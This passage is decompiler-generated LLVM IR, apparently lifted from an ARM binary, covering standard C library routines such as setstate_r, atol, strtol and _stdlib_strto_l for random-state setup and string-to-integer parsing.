  store i32 %v0_17fe0, i32* %r1.global-to-local, align 4
  %v0_17fe4 = load i32, i32* @r0, align 4
  %v2_17fe4 = inttoptr i32 %v0_17fe4 to i32*
  %v3_17fe4 = call i32 @srandom_r(i32* %v2_17fe4, i32 %v0_17fe0)
  store i32 %v3_17fe4, i32* %r0.global-to-local, align 4
  %v0_17fe8 = load i32, i32* @r4, align 4
  %v2_17fe8 = icmp eq i32 %v0_17fe8, 0
  br i1 %v2_17fe8, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_1800412 = load i32, i32* @r7, align 4
  %v2_1800413 = inttoptr i32 %v1_1800412 to i32*
  store i32 0, i32* %v2_1800413, align 4
  %v1_18008 = load i32, i32* @r4, align 4
  store i32 %v1_18008, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18038

.thread4:                                         ; preds = %bb26
  %v1_17fec = load i32, i32* @r5, align 4
  %v2_17fec = add i32 %v1_17fec, 4
  %v3_17fec = inttoptr i32 %v2_17fec to i32*
  %v4_17fec = load i32, i32* %v3_17fec, align 4
  %v1_17ff0 = load i32, i32* @r6, align 4
  %v3_17ff0 = sub i32 %v4_17fec, %v1_17ff0
  %v4_17ff4 = sdiv i32 %v3_17ff0, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_17ffc = mul i32 %v4_17ff4, 5
  %v5_17ffc = add i32 %v4_17ffc, %v0_17fe8
  store i32 %v5_17ffc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_18004 = load i32, i32* @r7, align 4
  %v2_18004 = inttoptr i32 %v1_18004 to i32*
  store i32 0, i32* %v2_18004, align 4
  %v1_1800c = load i32, i32* %r3.global-to-local, align 4
  %v2_1800c = load i32, i32* @r7, align 4
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  store i32 %v1_1800c, i32* %v3_1800c, align 4
  %v1_18040.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18038

dec_label_pc_18014:                               ; preds = %dec_label_pc_17f94
  store i32 106596, i32* %r3.global-to-local, align 4
  %v0_18018 = call i32 @__aeabi_read_tp()
  %v3_1801c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1801c = sext i16 %v3_1801c to i32
  store i32 22, i32* %r2.global-to-local, align 4
  %v3_18024 = add i32 %v4_1801c, %v0_18018
  %v4_18024 = inttoptr i32 %v3_18024 to i32*
  store i32 22, i32* %v4_18024, align 4
  store i32 %v4_1801c, i32* %r3.global-to-local, align 4
  %v0_18030 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_18030, i32* %v4_18024, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18038

dec_label_pc_18038:                               ; preds = %bb27, %.thread4, %dec_label_pc_18014
  %v1_18040 = phi i32 [ %v1_18040.pre, %.thread4 ], [ %v1_18008, %bb27 ], [ -1, %dec_label_pc_18014 ]
  store i32 %v3_17f5c, i32* @r4, align 4
  store i32 %v6_17f5c, i32* @r5, align 4
  ret i32 %v1_18040

; uselistorder directives
  uselistorder i32 %v4_1801c, { 1, 0 }
  uselistorder i1 %v7_17fa4, { 1, 0 }
  uselistorder i1 %v7_17f7c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_18038, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18054 = load i32, i32* @r4, align 4
  store i32 %v3_18054, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_1805c = add i32 %tmp, 12
  %v2_1805c = inttoptr i32 %v1_1805c to i8*
  %v3_1805c = load i8, i8* %v2_1805c, align 1
  %v4_1805c = zext i8 %v3_1805c to i32
  store i32 %v4_1805c, i32* %r1.global-to-local, align 4
  %v2_18060 = icmp eq i8 %v3_1805c, 0
  store i1 %v2_18060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18060, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_1806812 = add i32 %arg1, 4
  store i32 %v1_1806812, i32* %r6.global-to-local, align 4
  %v1_1806c13 = add i32 %tmp, 8
  %v2_1806c14 = inttoptr i32 %v1_1806c13 to i32*
  %v3_1806c15 = load i32, i32* %v2_1806c14, align 4
  store i32 %v3_1806c15, i32* %r0.global-to-local, align 4
  %v3_18088 = add i32 %v3_1806c15, -4
  %v4_18088 = inttoptr i32 %v3_18088 to i32*
  store i32 %v4_1805c, i32* %v4_18088, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_18064 = add i32 %tmp, 4
  %v3_18064 = inttoptr i32 %v2_18064 to i32*
  %v4_18064 = load i32, i32* %v3_18064, align 4
  %v1_18068 = add i32 %arg1, 4
  store i32 %v1_18068, i32* %r6.global-to-local, align 4
  %v1_1806c = add i32 %tmp, 8
  %v2_1806c = inttoptr i32 %v1_1806c to i32*
  %v3_1806c = load i32, i32* %v2_1806c, align 4
  store i32 %v3_1806c, i32* %r0.global-to-local, align 4
  %v3_18074 = sub i32 %v4_18064, %v3_1806c
  %v4_18078 = sdiv i32 %v3_18074, 4
  %v4_1807c = sext i8 %v3_1805c to i32
  store i32 %v4_1807c, i32* %r1.global-to-local, align 4
  %v4_18084 = mul i32 %v4_18078, 5
  %v5_18084 = add i32 %v4_18084, %v4_1807c
  %v3_1808c = add i32 %v3_1806c, -4
  %v4_1808c = inttoptr i32 %v3_1808c to i32*
  store i32 %v5_18084, i32* %v4_1808c, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_18090 = load i32, i32* %r6.global-to-local, align 4
  %v1_18090 = add i32 %v0_18090, -4
  %v2_18090 = inttoptr i32 %v1_18090 to i32*
  %v3_18090 = load i32, i32* %v2_18090, align 4
  store i32 %v3_18090, i32* %r8.global-to-local, align 4
  %v2_1809c = udiv i32 %v3_18090, 5
  %v3_1809c = urem i32 %v3_18090, 5
  store i32 %v2_1809c, i32* %r0.global-to-local, align 4
  store i32 %v3_1809c, i32* %r1.global-to-local, align 4
  %v2_180a4 = icmp ugt i32 %v3_1809c, 3
  %v7_180a4 = icmp eq i32 %v3_1809c, 4
  store i1 %v7_180a4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r5.global-to-local, align 4
  %v2_180ac = xor i1 %v7_180a4, true
  %v3_180ac = and i1 %v2_180a4, %v2_180ac
  br i1 %v3_180ac, label %dec_label_pc_18114, label %dec_label_pc_180b0

dec_label_pc_180b0:                               ; preds = %bb
  %v4_180b8 = mul nuw nsw i32 %v3_1809c, 4
  %v5_180b8 = add i32 %v4_180b8, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35740)
  %v1_180bc = add i32 %v4_180b8, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35720)
  %v2_180bc = inttoptr i32 %v1_180bc to i32*
  %v3_180bc = load i32, i32* %v2_180bc, align 4
  store i32 %v3_180bc, i32* %r5.global-to-local, align 4
  %v6_180c0 = inttoptr i32 %v5_180b8 to i32*
  %v7_180c0 = load i32, i32* %v6_180c0, align 4
  store i32 %v7_180c0, i32* %r7.global-to-local, align 4
  %v2_180c4 = icmp eq i32 %v3_1809c, 0
  store i1 %v2_180c4, i1* %cpsr_z.global-to-local, align 1
  %v1_180c8 = trunc i32 %v3_180bc to i8
  %v2_180c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_180c8 = add i32 %v2_180c8, 13
  %v4_180c8 = inttoptr i32 %v3_180c8 to i8*
  store i8 %v1_180c8, i8* %v4_180c8, align 1
  %v0_180cc = load i32, i32* %r7.global-to-local, align 4
  %v1_180cc = trunc i32 %v0_180cc to i8
  %v2_180cc = load i32, i32* %r4.global-to-local, align 4
  %v3_180cc = add i32 %v2_180cc, 14
  %v4_180cc = inttoptr i32 %v3_180cc to i8*
  store i8 %v1_180cc, i8* %v4_180cc, align 1
  %v0_180d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_180d0 = trunc i32 %v0_180d0 to i8
  %v2_180d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_180d0 = add i32 %v2_180d0, 12
  %v4_180d0 = inttoptr i32 %v3_180d0 to i8*
  store i8 %v1_180d0, i8* %v4_180d0, align 1
  %v0_180d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_180d4, label %dec_label_pc_18100, label %dec_label_pc_180d8

dec_label_pc_180d8:                               ; preds = %dec_label_pc_180b0
  %v0_180dc = load i32, i32* %r8.global-to-local, align 4
  %v2_180e0 = sdiv i32 %v0_180dc, 5
  store i32 %v2_180e0, i32* %r0.global-to-local, align 4
  %v0_180e4 = load i32, i32* %r6.global-to-local, align 4
  %v4_180e4 = mul i32 %v2_180e0, 4
  %v5_180e4 = add i32 %v4_180e4, %v0_180e4
  %v1_180e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_180e8 = add i32 %v1_180e8, 4
  %v3_180e8 = inttoptr i32 %v2_180e8 to i32*
  store i32 %v5_180e4, i32* %v3_180e8, align 4
  %v0_180ec = load i32, i32* %r7.global-to-local, align 4
  %v1_180ec = load i32, i32* %r0.global-to-local, align 4
  %v2_180ec = add i32 %v1_180ec, %v0_180ec
  %v0_180f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_180f4 = udiv i32 %v2_180ec, %v0_180f0
  %v3_180f4 = urem i32 %v2_180ec, %v0_180f0
  store i32 %v2_180f4, i32* %r0.global-to-local, align 4
  %v0_180f8 = load i32, i32* %r6.global-to-local, align 4
  %v4_180f8 = mul i32 %v3_180f4, 4
  %v5_180f8 = add i32 %v0_180f8, %v4_180f8
  store i32 %v5_180f8, i32* %r1.global-to-local, align 4
  %v1_180fc = load i32, i32* %r4.global-to-local, align 4
  %v2_180fc = inttoptr i32 %v1_180fc to i32*
  store i32 %v5_180f8, i32* %v2_180fc, align 4
  br label %dec_label_pc_18100

dec_label_pc_18100:                               ; preds = %dec_label_pc_180b0, %dec_label_pc_180d8
  %v0_18100 = load i32, i32* %r6.global-to-local, align 4
  %v1_18100 = load i32, i32* %r5.global-to-local, align 4
  %v4_18100 = mul i32 %v1_18100, 4
  %v5_18100 = add i32 %v4_18100, %v0_18100
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_18108 = load i32, i32* %r4.global-to-local, align 4
  %v2_18108 = add i32 %v1_18108, 16
  %v3_18108 = inttoptr i32 %v2_18108 to i32*
  store i32 %v5_18100, i32* %v3_18108, align 4
  %v0_1810c = load i32, i32* %r6.global-to-local, align 4
  %v1_1810c = load i32, i32* %r4.global-to-local, align 4
  %v2_1810c = add i32 %v1_1810c, 8
  %v3_1810c = inttoptr i32 %v2_1810c to i32*
  store i32 %v0_1810c, i32* %v3_1810c, align 4
  %v1_18130.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1812c

dec_label_pc_18114:                               ; preds = %bb
  %v0_18118 = call i32 @__aeabi_read_tp()
  %v3_1811c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1811c = sext i16 %v3_1811c to i32
  %v3_18124 = add i32 %v4_1811c, %v0_18118
  %v4_18124 = inttoptr i32 %v3_18124 to i32*
  store i32 22, i32* %v4_18124, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %dec_label_pc_18100, %dec_label_pc_18114
  %v1_18130 = phi i32 [ %v1_18130.pre, %dec_label_pc_18100 ], [ -1, %dec_label_pc_18114 ]
  %v2_1812c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1812c, i32* @r4, align 4
  ret i32 %v1_18130

; uselistorder directives
  uselistorder i32 %v0_180f0, { 1, 0 }
  uselistorder i32 %v2_180ec, { 1, 0 }
  uselistorder i32 %v3_18090, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 6, 8, 9, 7, 4, 5, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35740), { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1812c, { 1, 0 }
  uselistorder label %dec_label_pc_18100, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_18150 = call i32 @strtol()
  ret i32 %v0_18150
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1816c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1816c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v0_18190 = load i32, i32* @r1, align 4
  store i32 %v0_18190, i32* %sb.global-to-local, align 4
  %v0_18194 = load i32, i32* @r2, align 4
  store i32 %v0_18194, i32* %r5.global-to-local, align 4
  %v0_18198 = load i32, i32* @r0, align 4
  store i32 %v0_18198, i32* %r4.global-to-local, align 4
  %v0_1819c = load i32, i32* @r3, align 4
  br label %dec_label_pc_181a8

dec_label_pc_181a4:                               ; preds = %dec_label_pc_181a8
  %v1_181a4 = add i32 %v0_181e0, 1
  store i32 %v1_181a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_181a8

dec_label_pc_181a8:                               ; preds = %entry, %dec_label_pc_181a4
  %v0_181e0 = phi i32 [ %v0_18198, %entry ], [ %v1_181a4, %dec_label_pc_181a4 ]
  %v1_181a8 = inttoptr i32 %v0_181e0 to i8*
  %v2_181a8 = load i8, i8* %v1_181a8, align 1
  %v3_181a8 = zext i8 %v2_181a8 to i32
  store i32 %v3_181a8, i32* %r1.global-to-local, align 4
  %v4_181ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 636) to i32*), align 4
  %v2_181b0 = mul nuw nsw i32 %v3_181a8, 2
  %v2_181b4 = add i32 %v2_181b0, %v4_181ac
  %v3_181b4 = inttoptr i32 %v2_181b4 to i16*
  %v4_181b4 = load i16, i16* %v3_181b4, align 2
  %v1_181b8 = and i16 %v4_181b4, 32
  %v2_181b8 = icmp eq i16 %v1_181b8, 0
  br i1 %v2_181b8, label %dec_label_pc_181c0, label %dec_label_pc_181a4

dec_label_pc_181c0:                               ; preds = %dec_label_pc_181a8
  %v7_181c0 = icmp eq i8 %v2_181a8, 43
  br i1 %v7_181c0, label %dec_label_pc_181e0, label %dec_label_pc_181c8

dec_label_pc_181c8:                               ; preds = %dec_label_pc_181c0
  %v7_181c8 = icmp eq i8 %v2_181a8, 45
  br i1 %v7_181c8, label %dec_label_pc_181e0, label %bb

bb:                                               ; preds = %dec_label_pc_181c8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_181e4

dec_label_pc_181e0:                               ; preds = %dec_label_pc_181c0, %dec_label_pc_181c8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_181c8 ], [ 0, %dec_label_pc_181c0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_181e0 = add i32 %v0_181e0, 1
  store i32 %v1_181e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %bb, %dec_label_pc_181e0
  %v0_18204 = phi i32 [ %v0_181e0, %bb ], [ %v1_181e0, %dec_label_pc_181e0 ]
  %v1_181e4 = and i32 %v0_18194, -17
  %v3_181e4 = icmp eq i32 %v1_181e4, 0
  br i1 %v3_181e4, label %dec_label_pc_181f0, label %bb60

bb60:                                             ; preds = %dec_label_pc_181e4
  br label %bb64

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181e4
  %v1_181f0 = inttoptr i32 %v0_18204 to i8*
  %v2_181f0 = load i8, i8* %v1_181f0, align 1
  %v7_181f4 = icmp eq i8 %v2_181f0, 48
  %v1_181f8 = add i32 %v0_18194, 10
  store i32 %v1_181f8, i32* %r5.global-to-local, align 4
  br i1 %v7_181f4, label %dec_label_pc_18204, label %bb61

bb61:                                             ; preds = %dec_label_pc_181f0
  br label %.thread8

dec_label_pc_18204:                               ; preds = %dec_label_pc_181f0
  %v1_18204 = add i32 %v0_18204, 1
  %v2_18204 = inttoptr i32 %v1_18204 to i8*
  %v3_18204 = load i8, i8* %v2_18204, align 1
  %v4_18204 = zext i8 %v3_18204 to i32
  store i32 %v1_18204, i32* %r4.global-to-local, align 4
  %v1_18208 = or i32 %v4_18204, 32
  %v7_1820c = icmp eq i32 %v1_18208, 120
  %v1_18210 = add i32 %v0_18194, 8
  store i32 %v1_18210, i32* %r5.global-to-local, align 4
  br i1 %v7_1820c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_18204
  %v3_1821c = mul i32 %v1_18210, 2
  store i32 %v3_1821c, i32* %r5.global-to-local, align 4
  %v2_18220 = add i32 %v0_18204, 2
  store i32 %v2_18220, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18204, %bb61, %bb62
  %v1_182f430 = phi i32 [ %v0_18198, %bb61 ], [ %v1_18204, %bb62 ], [ %v1_18204, %dec_label_pc_18204 ]
  %v0_1827021 = phi i32 [ %v0_18204, %bb61 ], [ %v2_18220, %bb62 ], [ %v1_18204, %dec_label_pc_18204 ]
  %v0_18224 = phi i32 [ %v1_181f8, %bb61 ], [ %v3_1821c, %bb62 ], [ %v1_18210, %dec_label_pc_18204 ]
  %v5_18228 = icmp slt i32 %v0_18224, 16
  br i1 %v5_18228, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_182f429 = phi i32 [ %v0_18198, %bb60 ], [ %v1_182f430, %.thread8 ], [ %v1_182f430, %bb63 ]
  %v0_1827020 = phi i32 [ %v0_18204, %bb60 ], [ %v0_1827021, %.thread8 ], [ %v0_1827021, %bb63 ]
  %v0_18250 = phi i32 [ %v0_18194, %bb60 ], [ %v0_18224, %.thread8 ], [ 16, %bb63 ]
  %v1_1822c = add i32 %v0_18250, -2
  %tmp = icmp ugt i32 %v1_1822c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1823c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_182f0

dec_label_pc_1823c:                               ; preds = %bb64
  %v2_18244 = udiv i32 -1, %v0_18250
  %v3_18244 = urem i32 -1, %v0_18250
  store i32 %v0_18250, i32* %r1.global-to-local, align 4
  %v1_18254 = urem i32 %v3_18244, 256
  store i32 %v1_18254, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_18244, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18270

dec_label_pc_1826c:                               ; preds = %bb71, %dec_label_pc_182cc
  %v0_1826c = phi i32 [ %v1_182ac44, %bb71 ], [ %v0_1826c.pre, %dec_label_pc_182cc ]
  br label %dec_label_pc_18270

dec_label_pc_18270:                               ; preds = %dec_label_pc_1823c, %dec_label_pc_1826c
  %v1_182f427 = phi i32 [ %v1_182f429, %dec_label_pc_1823c ], [ %v0_1826c, %dec_label_pc_1826c ]
  %v0_182ac = phi i32 [ %v0_1827020, %dec_label_pc_1823c ], [ %v0_1826c, %dec_label_pc_1826c ]
  %v1_18270 = inttoptr i32 %v0_182ac to i8*
  %v2_18270 = load i8, i8* %v1_18270, align 1
  %v3_18270 = zext i8 %v2_18270 to i32
  %v1_18274 = add nsw i32 %v3_18270, -48
  %v1_18278 = urem i32 %v1_18274, 256
  store i32 %v1_18278, i32* %r1.global-to-local, align 4
  %v1_18280 = or i32 %v3_18270, 32
  %tmp79 = icmp ult i32 %v1_18278, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_18288

dec_label_pc_18288:                               ; preds = %dec_label_pc_18270
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_18280, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_18288
  %v1_1828c = add nsw i32 %v1_18280, -87
  %v5_18294 = urem i32 %v1_1828c, 256
  store i32 %v5_18294, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18270, %dec_label_pc_18288, %bb65
  %v3_182c4 = phi i32 [ %v1_18278, %dec_label_pc_18270 ], [ 40, %dec_label_pc_18288 ], [ %v5_18294, %bb65 ]
  %v1_18298 = load i32, i32* %r5.global-to-local, align 4
  %v6_1829c = icmp slt i32 %v3_182c4, %v1_18298
  br i1 %v6_1829c, label %dec_label_pc_182a0, label %dec_label_pc_182f0.loopexit

dec_label_pc_182a0:                               ; preds = %bb66
  %v0_182a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_182a0 = load i32, i32* %r8.global-to-local, align 4
  %v9_182a0 = icmp eq i32 %v0_182a0, %v1_182a0
  br i1 %v9_182a0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_182a0
  %v1_182ac40 = add i32 %v0_182ac, 1
  store i32 %v1_182ac40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_182b4

bb67:                                             ; preds = %dec_label_pc_182a0
  %v3_182a0 = icmp ult i32 %v0_182a0, %v1_182a0
  %v1_182ac = add i32 %v0_182ac, 1
  store i32 %v1_182ac, i32* %r4.global-to-local, align 4
  br i1 %v3_182a0, label %dec_label_pc_182b4, label %dec_label_pc_182cc

dec_label_pc_182b4:                               ; preds = %bb67, %.thread39
  %v1_182ac44 = phi i32 [ %v1_182ac40, %.thread39 ], [ %v1_182ac, %bb67 ]
  %v4_182bc2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_182b4 = load i32, i32* %sl.global-to-local, align 4
  %v3_182b4 = icmp uge i32 %v3_182c4, %v1_182b4
  %v9_182b4 = icmp eq i32 %v3_182c4, %v1_182b4
  %v2_182b8 = xor i1 %v3_182b4, true
  %v3_182b8 = or i1 %v9_182b4, %v2_182b8
  br i1 %v3_182b8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_182b4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_182b4, %bb68
  %v4_182bc = phi i32 [ %v4_182bc2443, %dec_label_pc_182b4 ], [ 0, %bb68 ]
  %v2_182bc = xor i1 %v9_182b4, true
  %v3_182bc = and i1 %v3_182b4, %v2_182bc
  br i1 %v3_182bc, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_182bc = urem i32 %v4_182bc, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_182c0 = phi i32 [ %v5_182bc, %bb70 ], [ %v4_182bc, %bb69 ]
  %v2_182c0 = icmp eq i32 %v0_182c0, 0
  br i1 %v2_182c0, label %bb71, label %dec_label_pc_182cc

bb71:                                             ; preds = %thread-pre-split
  %v4_182c4 = mul i32 %v0_182a0, %v1_18298
  %v5_182c4 = add i32 %v4_182c4, %v3_182c4
  store i32 %v5_182c4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1826c

dec_label_pc_182cc:                               ; preds = %bb67, %thread-pre-split
  %v0_182d4 = call i32 @__aeabi_read_tp()
  %v0_182d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_182d8 = and i32 %v0_1819c, %v0_182d8
  store i32 %v2_182d8, i32* %r7.global-to-local, align 4
  %v0_182dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_182dc, i32* %ip.global-to-local, align 4
  %v3_182e0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_182e0 = sext i16 %v3_182e0 to i32
  %v3_182e8 = add i32 %v4_182e0, %v0_182d4
  %v4_182e8 = inttoptr i32 %v3_182e8 to i32*
  store i32 34, i32* %v4_182e8, align 4
  %v0_1826c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1826c

dec_label_pc_182f0.loopexit:                      ; preds = %bb66
  %v0_182f0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_182f0

dec_label_pc_182f0:                               ; preds = %.thread, %dec_label_pc_182f0.loopexit
  %v1_182f4 = phi i32 [ %v1_182f427, %dec_label_pc_182f0.loopexit ], [ %v1_182f429, %.thread ]
  %v2_182f4 = phi i32 [ %v0_182f0.pre, %dec_label_pc_182f0.loopexit ], [ %v0_18190, %.thread ]
  %v2_182f0 = icmp eq i32 %v2_182f4, 0
  br i1 %v2_182f0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_182f0
  %v3_182f4 = inttoptr i32 %v2_182f4 to i32*
  store i32 %v1_182f4, i32* %v3_182f4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_182f0, %bb72
  %v0_182fc = load i32, i32* %r7.global-to-local, align 4
  %v2_182fc = icmp eq i32 %v0_182fc, 0
  %. = select i1 %v2_182fc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_18308 = icmp eq i32 %v0_1819c, 0
  %v0_18334.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_18308, label %dec_label_pc_1832c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_18334.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_18314, label %dec_label_pc_1832c

dec_label_pc_18314:                               ; preds = %bb76
  %v0_18318 = call i32 @__aeabi_read_tp()
  %v3_1831c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1831c = sext i16 %v3_1831c to i32
  %v3_18324 = add i32 %v4_1831c, %v0_18318
  %v4_18324 = inttoptr i32 %v3_18324 to i32*
  store i32 34, i32* %v4_18324, align 4
  %v0_18328 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18328, i32* %ip.global-to-local, align 4
  %v0_1832c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %bb76, %bb73, %dec_label_pc_18314
  %v0_18334.pre = phi i32 [ %v0_18334.pre.pre, %bb76 ], [ %v0_18328, %dec_label_pc_18314 ], [ %v0_18334.pre.pre, %bb73 ]
  %v0_1832c = phi i32 [ %v0_182fc, %bb76 ], [ %v0_1832c.pre, %dec_label_pc_18314 ], [ %v0_182fc, %bb73 ]
  %v2_1832c = icmp eq i32 %v0_1832c, 0
  br i1 %v2_1832c, label %dec_label_pc_1832c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1832c
  %v2_18330 = sub i32 0, %v0_18334.pre
  store i32 %v2_18330, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1832c._crit_edge

dec_label_pc_1832c._crit_edge:                    ; preds = %dec_label_pc_1832c, %bb77
  %v0_18334 = phi i32 [ %v2_18330, %bb77 ], [ %v0_18334.pre, %dec_label_pc_1832c ]
  ret i32 %v0_18334

; uselistorder directives
  uselistorder i32 %v0_18334.pre, { 1, 0 }
  uselistorder i32 %v0_18334.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_182bc, { 1, 0 }
  uselistorder i1 %v3_182b4, { 1, 0 }
  uselistorder i32 %v1_182b4, { 1, 0 }
  uselistorder i32 %v5_18294, { 1, 0 }
  uselistorder i32 %v1_18280, { 1, 0 }
  uselistorder i32 %v1_18278, { 2, 0, 1 }
  uselistorder i32 %v0_182ac, { 1, 0, 2 }
  uselistorder i32 %v0_1826c, { 1, 0 }
  uselistorder i32 %v3_1821c, { 1, 0 }
  uselistorder i32 %v1_18210, { 1, 0, 2 }
  uselistorder i32 %v0_18204, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_181e0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1819c, { 1, 0 }
  uselistorder i32 %v0_18198, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18194, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
